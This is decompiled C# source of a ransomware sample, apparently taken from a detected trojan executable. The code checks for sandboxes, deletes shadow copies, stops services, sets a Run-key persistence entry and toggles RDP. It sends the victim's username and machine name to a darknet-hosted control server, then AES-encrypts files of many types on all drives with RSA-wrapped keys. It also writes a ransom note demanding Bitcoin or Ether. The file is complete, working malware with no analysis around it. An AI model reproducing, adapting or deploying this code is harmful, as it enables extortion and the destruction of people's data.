// Decompiled with JetBrains decompiler
// Type: @ӕ
// Assembly: crsss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 63177BA9-E9B9-4A23-9C89-1A1B4D5A92C4
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Agent.gen-458ad7362cfb6980b9e7eb19ab83ddc6d261bf6b057f1892267dd55c656e9686.exe

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class \u0040ӕ : Form
{
  private IContainer \u0040ӓ;
  private static bool \u0040Ӕ;
  private const int \u0040ӕ = 4096;
  private string \u0040Ӗ;
  private int \u0040ӗ;
  private string \u0040Ә;
  private string \u0040ә = \u0040ӕ.\u0040ӡ(128);
  private string \u0040Ӛ = \u0040ӕ.\u0040ӳ(128);
  private string \u0040ӛ = Environment.UserName;
  private string \u0040Ӝ = Environment.MachineName.ToString();
  private string \u0040ӝ = "C:\\Users\\";
  private string \u0040Ӟ = "http://v4u3zio7rhmgkzzk5jvekgojl6an3dthyxzapy3zhdhhaelnj6iicfqd.darknet.to/ck.php";
  private string \u0040ӟ = "http://v4u3zio7rhmgkzzk5jvekgojl6an3dthyxzapy3zhdhhaelnj6iicfqd.darknet.to/sk.php";

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.\u0040ӓ != null)
      this.\u0040ӓ.Dispose();
    base.Dispose(disposing);
  }

  private void \u0040Ӡ()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (\u0040ӕ));
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(284, 261);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = "Form1";
    this.Text = "Form1";
    this.Load += new EventHandler(this.\u0040ӣ);
    this.ResumeLayout(false);
  }

  public static string \u0040ӡ(int _param0) => new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", _param0).Select<string, char>(new Func<string, char>(new \u0040ӕ.a()
  {
    a = new Random()
  }.b)).ToArray<char>());

  [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto)]
  private static extern int \u0040Ӣ(uint _param0, uint _param1, string _param2, uint _param3);

  public \u0040ӕ()
  {
    this.\u0040Ӡ();
    if (string.Compare(this.\u0040ӛ.ToLower() + "-pc", this.\u0040Ӝ.ToLower()) != 0)
      return;
    System.IO.File.WriteAllText("ReadMe.txt", "We are so sorry but keys is unique for each run of this app. Please do not spam our logs with your sandboxes");
    Environment.Exit(1);
  }

  private void \u0040ӣ(object _param1, EventArgs _param2)
  {
    try
    {
      this.\u0040Ӧ();
    }
    catch
    {
    }
  }

  public string \u0040Ӥ(string _param1, string _param2, string _param3)
  {
    WebClient webClient = new WebClient();
    string str = Encoding.UTF8.GetString(webClient.UploadValues(_param1, "POST", new NameValueCollection()
    {
      ["id"] = this.\u0040ә,
      ["username"] = this.\u0040ӛ,
      ["pname"] = this.\u0040Ӝ,
      ["kid"] = _param2,
      ["ppath"] = _param3
    }));
    webClient.Dispose();
    return str;
  }

  public void \u0040ӥ(string _param1, string _param2)
  {
    WebClient webClient = new WebClient();
    webClient.UploadValues(_param1, "POST", new NameValueCollection()
    {
      ["id"] = this.\u0040ә,
      ["pname"] = this.\u0040Ӝ,
      ["ad"] = this.\u0040Ә,
      ["kid"] = _param2
    });
    webClient.Dispose();
  }

  public void \u0040Ӧ()
  {
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "vssadmin.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " delete shadows /all /quiet"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "net.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " stop TeamViewer /y"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "vssadmin.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " delete shadows /all /quiet"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "taskkill.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " /f /im 1cv8.exe"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "reg.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "reg.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"wininit\" /t REG_SZ /F /D \"C:\\windows\\wininit.exe\""
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "net.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " stop mssqlserver /y"
        }
      }.Start();
    }
    catch
    {
    }
    string contents1 = "Your files are now encrypted!\r\nYour personal identifier:\r\n" + this.\u0040ә + "\r\nAll your files have been encrypted due to a security problem with your PC.\r\n\r\nNow you should send us email with your personal identifier.\r\nThis email will be as confirmation you are ready to pay for decryption key.\r\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\r\nAfter payment we will send you the decryption tool that will decrypt all your files.\r\nContact us using this email address: cryptopatronum@protonmail.com\r\nFree decryption as guarantee!\r\nBefore paying you can send us up to 3 files for free decryption.\r\nThe total size of files must be less than 10Mb (non archived), and files should not contain\r\nvaluable information (databases, backups, large excel sheets, etc.).\r\nFor decrypt all of files you must transfer 1 (one) BTC or 50 (fifty) ETH to this requisites:\r\nBitcoin address: 17mriroop9nWyNT8hoHS1XodEucBm9AgMq\r\nEthereum address: 0xD994268684e694C81C8C7214E4fc4Ca792AD4B3A\r\nYou should provide payment details(payment time, payment address or transaction link (https://www.blockchain.com)) via email\r\nHow to obtain Bitcoins, Ethereum?\r\n  * The easiest way to buy bitcoins is cex.io and coinbase.com sites. You have to register, click\r\n    'Buy bitcoins', and select the payment method:\r\n      https://cex.io/cards/\r\n\t  https://www.coinbase.com/buy-bitcoin\r\n  * Also you can buy bitcoins on Binex:      https://www.binance.com/en/buy-sell-crypto\r\n  * Also you can find other places to buy Bitcoins and beginners guide here:\r\n      http://www.coindesk.com/information/how-can-i-buy-bitcoins\r\n   Attention!\r\n    * Do not rename encrypted files.\r\n  * Do not try to decrypt your data using third party software, it may cause permanent data loss.\r\n   * Decryption of your files with the help of third parties may cause increased price\r\n     (they add their fee to our) or you can become a victim of a scam.\r\n  ";
    try
    {
      System.IO.File.WriteAllText("C:\\HOW TO RECOVER ENCRYPTED FILES.txt", contents1);
    }
    catch
    {
    }
    string str1 = this.\u0040ӝ + this.\u0040ӛ + "\\Desktop\\";
    string str2 = \u0040ӕ.\u0040ӡ(32);
    string str3 = this.\u0040Ӥ(this.\u0040Ӟ, str2, str1);
    string str4 = \u0040ӕ.\u0040ӳ(128);
    this.\u0040Ә = \u0040ӕ.\u0040Ӱ(str4, 4096, str3);
    this.\u0040ӥ(this.\u0040ӟ, str2);
    try
    {
      this.\u0040Ӯ(str1, str4);
    }
    catch
    {
    }
    try
    {
      new Thread(new ThreadStart(this.\u0040ө)).Start();
      Thread.Sleep(2000);
      ++this.\u0040ӗ;
    }
    catch
    {
      --this.\u0040ӗ;
    }
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.Name != "C:\\")
      {
        if (drive.Name != "C:\\\\")
        {
          try
          {
            new Thread(new ParameterizedThreadStart(this.\u0040Ө)).Start((object) drive.Name);
            Thread.Sleep(2000);
            ++this.\u0040ӗ;
          }
          catch
          {
            --this.\u0040ӗ;
          }
        }
      }
    }
    GC.Collect();
    string contents2 = "Your files are now encrypted!\r\nYour personal identifier:\r\n" + this.\u0040ә + "\r\nAll your files have been encrypted due to a security problem with your PC.\r\n\r\nNow you should send us email with your personal identifier.\r\nThis email will be as confirmation you are ready to pay for decryption key.\r\nYou have to pay for decryption in Bitcoins. The price depends on how fast you write to us.\r\nAfter payment we will send you the decryption tool that will decrypt all your files.\r\nContact us using this email address: cryptopatronum@protonmail.com\r\nFree decryption as guarantee!\r\nBefore paying you can send us up to 3 files for free decryption.\r\nThe total size of files must be less than 10Mb (non archived), and files should not contain\r\nvaluable information (databases, backups, large excel sheets, etc.).\r\nFor decrypt all of files you must transfer 1 (one) BTC or 50 (fifty) ETH to this requisites:\r\nBitcoin address: 17mriroop9nWyNT8hoHS1XodEucBm9AgMq\r\nEthereum address: 0xD994268684e694C81C8C7214E4fc4Ca792AD4B3A\r\nYou should provide payment details(payment time, payment address or transaction link (https://www.blockchain.com)) via email\r\nHow to obtain Bitcoins, Ethereum?\r\n  * The easiest way to buy bitcoins is cex.io and coinbase.com sites. You have to register, click\r\n    'Buy bitcoins', and select the payment method:\r\n      https://cex.io/cards/\r\n\t  https://www.coinbase.com/buy-bitcoin\r\n  * Also you can buy bitcoins on Binex:      https://www.binance.com/en/buy-sell-crypto\r\n  * Also you can find other places to buy Bitcoins and beginners guide here:\r\n      http://www.coindesk.com/information/how-can-i-buy-bitcoins\r\n   Attention!\r\n    * Do not rename encrypted files.\r\n  * Do not try to decrypt your data using third party software, it may cause permanent data loss.\r\n   * Decryption of your files with the help of third parties may cause increased price\r\n     (they add their fee to our) or you can become a victim of a scam.\r\n  ";
    try
    {
      System.IO.File.WriteAllText(this.\u0040ӝ + "Administrator\\Desktop\\HOW TO RECOVER ENCRYPTED FILES.txt", contents2);
    }
    catch
    {
    }
    try
    {
      System.IO.File.WriteAllText("C:\\HOW TO RECOVER ENCRYPTED FILES.txt", contents2);
    }
    catch
    {
    }
    while (this.\u0040ӗ > 0)
      Thread.Sleep(2000);
    this.\u0040ӭ();
    GC.Collect();
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "reg.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"wininit\" /f"
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = "reg.exe",
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = " add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
        }
      }.Start();
    }
    catch
    {
    }
    Application.Exit();
  }

  public void \u0040ӧ(string _param1)
  {
    string str1 = _param1 + "\\";
    string str2 = \u0040ӕ.\u0040ӡ(32);
    string str3 = str1;
    this.\u0040Ӗ = this.\u0040Ӥ(this.\u0040Ӟ, str2, str1);
    string ӛ = this.\u0040Ӛ;
    this.\u0040Ә = \u0040ӕ.\u0040Ӱ(ӛ, 4096, this.\u0040Ӗ);
    this.\u0040ӥ(this.\u0040ӟ, str2);
    try
    {
      this.\u0040Ӯ(str3, ӛ);
    }
    catch
    {
    }
    --this.\u0040ӗ;
  }

  public void \u0040Ө(object _param1)
  {
    string str1 = _param1?.ToString() + "\\";
    string str2 = \u0040ӕ.\u0040ӡ(32);
    string str3 = str1;
    this.\u0040Ӗ = this.\u0040Ӥ(this.\u0040Ӟ, str2, str1);
    string str4 = \u0040ӕ.\u0040ӳ(128);
    this.\u0040Ә = \u0040ӕ.\u0040Ӱ(str4, 4096, this.\u0040Ӗ);
    this.\u0040ӥ(this.\u0040ӟ, str2);
    try
    {
      this.\u0040Ӯ(str3, str4);
    }
    catch
    {
    }
    --this.\u0040ӗ;
  }

  public void \u0040ө()
  {
    string str1 = "C:\\";
    string str2 = \u0040ӕ.\u0040ӡ(32);
    string str3 = str1;
    string str4 = "C:\\Users\\";
    this.\u0040Ӗ = this.\u0040Ӥ(this.\u0040Ӟ, str2, str1);
    string ӛ = this.\u0040Ӛ;
    this.\u0040Ә = \u0040ӕ.\u0040Ӱ(ӛ, 4096, this.\u0040Ӗ);
    this.\u0040ӥ(this.\u0040ӟ, str2);
    try
    {
      this.\u0040ӯ(str3, ӛ);
      this.\u0040Ӯ(str4, ӛ);
      this.\u0040Ӯ(str3, ӛ);
    }
    catch
    {
    }
    --this.\u0040ӗ;
  }

  public void \u0040Ӫ()
  {
    string str1 = "C:\\";
    string str2 = \u0040ӕ.\u0040ӡ(32);
    string str3 = str1;
    this.\u0040Ӗ = this.\u0040Ӥ(this.\u0040Ӟ, str2, str1);
    string ӛ = this.\u0040Ӛ;
    this.\u0040Ә = \u0040ӕ.\u0040Ӱ(ӛ, 4096, this.\u0040Ӗ);
    this.\u0040ӥ(this.\u0040ӟ, str2);
    try
    {
      this.\u0040Ӯ(str3, ӛ);
    }
    catch
    {
    }
    --this.\u0040ӗ;
  }

  public void \u0040ӫ(string _param1, string _param2)
  {
    try
    {
      byte[] bytes1 = Encoding.UTF8.GetBytes(_param2);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      if (new FileInfo(_param1).Length < 314572800L)
      {
        byte[] bytes2 = this.\u0040Ӳ(System.IO.File.ReadAllBytes(_param1), hash);
        System.IO.File.WriteAllBytes(_param1, bytes2);
      }
      else
      {
        try
        {
          FileStream fileStream = new FileStream(_param1, FileMode.Open, FileAccess.ReadWrite);
          long length1 = 10485760;
          byte[] numArray1 = new byte[length1];
          long length2 = fileStream.Length;
          if (length1 > length2)
            length1 = Convert.ToInt64(length2);
          long int64 = Convert.ToInt64(Math.Floor((double) (length2 / length1)));
          int num = 0;
          int count;
          while ((count = fileStream.Read(numArray1, 0, numArray1.Length)) > 0)
          {
            long offset = (long) num > int64 ? length2 - int64 * length1 : length1 * (long) num;
            fileStream.Seek(offset, SeekOrigin.Begin);
            byte[] numArray2 = new byte[count];
            Buffer.BlockCopy((Array) numArray1, 0, (Array) numArray2, 0, count);
            if ((long) num < int64)
              numArray2 = this.\u0040Ӳ(numArray2, hash, true);
            fileStream.Write(numArray2, 0, count);
            if ((long) num >= int64)
              length1 = length2 - offset;
            ++num;
          }
          fileStream.Dispose();
        }
        catch
        {
        }
      }
    }
    catch
    {
    }
    try
    {
      System.IO.File.Move(_param1, _param1 + ".cryptopatronum@protonmail.com.enc");
    }
    catch
    {
    }
  }

  private void \u0040Ӭ(object _param1, EventArgs _param2)
  {
    this.Visible = false;
    this.Opacity = 100.0;
  }

  public void \u0040ӭ()
  {
  }

  public void \u0040Ӯ(string _param1, string _param2)
  {
    try
    {
      string[] source = new string[147]
      {
        ".mid",
        ".wma",
        ".flv",
        ".mkv",
        ".mov",
        ".avi",
        ".asf",
        ".mpeg",
        ".vob",
        ".mpg",
        ".wmv",
        ".fla",
        ".swf",
        ".wav",
        ".qcow2",
        ".vdi",
        ".vmdk",
        ".vmx",
        ".gpg",
        ".aes",
        ".arc",
        ".paq",
        ".tar.bz2",
        ".tbk",
        ".bak",
        ".tar",
        ".tgz",
        ".rar",
        ".zip",
        ".djv",
        ".djvu",
        ".svg",
        ".bmp",
        ".png",
        ".gif",
        ".raw",
        ".cgm",
        ".jpeg",
        ".jpg",
        ".tif",
        ".tiff",
        ".nef",
        ".psd",
        ".cmd",
        ".class",
        ".jar",
        ".java",
        ".asp",
        ".brd",
        ".sch",
        ".dch",
        ".dip",
        ".vbs",
        ".asm",
        ".pas",
        ".cpp",
        ".php",
        ".ldf",
        ".mdf",
        ".ibd",
        ".myi",
        ".myd",
        ".frm",
        ".odb",
        ".dbf",
        ".mdb",
        ".sql",
        ".sqlitedb",
        ".sqlite33",
        ".asc",
        ".lay6",
        ".lay",
        ".ms11",
        ".sldm",
        ".sldx",
        ".ppsm",
        ".ppsx",
        ".ppam",
        ".docb",
        ".mml",
        ".sxm",
        ".otg",
        ".odg",
        ".uop",
        ".potx",
        ".potm",
        ".pptx",
        ".pptm",
        ".std",
        ".sxd",
        ".pot",
        ".pps",
        ".sti",
        ".sxi",
        ".otp",
        ".odp",
        ".wks",
        ".xltx",
        ".xltm",
        ".xlsx",
        ".xlsm",
        ".xlsb",
        ".slk",
        ".xlw",
        ".xlt",
        ".xlm",
        ".xlc",
        ".dif",
        ".stc",
        ".sxc",
        ".ots",
        ".ods",
        ".hwp",
        ".dotm",
        ".dotx",
        ".docm",
        ".docx",
        ".dot",
        ".max",
        ".xml",
        ".txt",
        ".csv",
        ".uot",
        ".rtf",
        ".pdf",
        ".xls",
        ".ppt",
        ".stw",
        ".sxw",
        ".ott",
        ".odt",
        ".doc",
        ".pem",
        ".csr",
        ".crt",
        ".key",
        " wallet.dat",
        ".dbm",
        ".dt",
        ".vhd",
        ".vhdx",
        ".conf",
        ".cfg",
        ".ini",
        ".doc",
        ".txt",
        ".7z"
      };
      string[] files = Directory.GetFiles(_param1);
      string[] directories = Directory.GetDirectories(_param1);
      for (int index = 0; index < files.Length; ++index)
      {
        string extension = Path.GetExtension(files[index]);
        long length = new FileInfo(files[index]).Length;
        if (((IEnumerable<string>) source).Contains<string>(extension.ToLower()))
        {
          try
          {
            this.\u0040ӫ(files[index], _param2);
          }
          catch
          {
          }
        }
        else if (length > 314572800L)
        {
          if (extension != ".cryptopatronum@protonmail.com.enc")
          {
            try
            {
              this.\u0040ӫ(files[index], _param2);
            }
            catch
            {
            }
          }
        }
      }
      for (int index = 0; index < directories.Length; ++index)
      {
        if (directories[index].ToLower() != "c:\\windows")
          this.\u0040Ӯ(directories[index], _param2);
      }
    }
    catch
    {
    }
  }

  public void \u0040ӯ(string _param1, string _param2)
  {
    try
    {
      string[] source = new string[3]
      {
        ".sys",
        ".vim",
        ".cryptopatronum@protonmail.com.enc"
      };
      string[] files = Directory.GetFiles(_param1);
      string[] directories = Directory.GetDirectories(_param1);
      for (int index = 0; index < files.Length; ++index)
      {
        string extension = Path.GetExtension(files[index]);
        long length = new FileInfo(files[index]).Length;
        if (!((IEnumerable<string>) source).Contains<string>(extension.ToLower()))
        {
          if (length > 314572800L)
          {
            try
            {
              this.\u0040ӫ(files[index], _param2);
            }
            catch
            {
            }
          }
        }
      }
      for (int index = 0; index < directories.Length; ++index)
        this.\u0040ӯ(directories[index], _param2);
    }
    catch
    {
    }
  }

  public static string \u0040Ӱ(string _param0, int _param1, string _param2) => Convert.ToBase64String(\u0040ӕ.\u0040ӱ(Encoding.UTF8.GetBytes(_param0), _param1, _param2));

  public static byte[] \u0040ӱ(byte[] _param0, int _param1, string _param2)
  {
    using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(_param1))
    {
      cryptoServiceProvider.FromXmlString(_param2);
      return cryptoServiceProvider.Encrypt(_param0, \u0040ӕ.\u0040Ӕ);
    }
  }

  public byte[] \u0040Ӳ(byte[] _param1, byte[] _param2, bool _param3 = false)
  {
    byte[] salt = new byte[17];
    using (MemoryStream memoryStream = new MemoryStream())
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(_param2, salt, 30);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        if (_param3)
          rijndaelManaged.Padding = PaddingMode.None;
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
          cryptoStream.Write(_param1, 0, _param1.Length);
          cryptoStream.Close();
        }
        return memoryStream.ToArray();
      }
    }
  }

  public static string \u0040ӳ(int _param0)
  {
    char[] chArray = new char[62];
    char[] charArray = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
    byte[] data = new byte[1];
    using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
    {
      cryptoServiceProvider.GetNonZeroBytes(data);
      data = new byte[_param0];
      cryptoServiceProvider.GetNonZeroBytes(data);
    }
    StringBuilder stringBuilder = new StringBuilder(_param0);
    foreach (byte num in data)
      stringBuilder.Append(charArray[(int) num % charArray.Length]);
    return stringBuilder.ToString();
  }
}
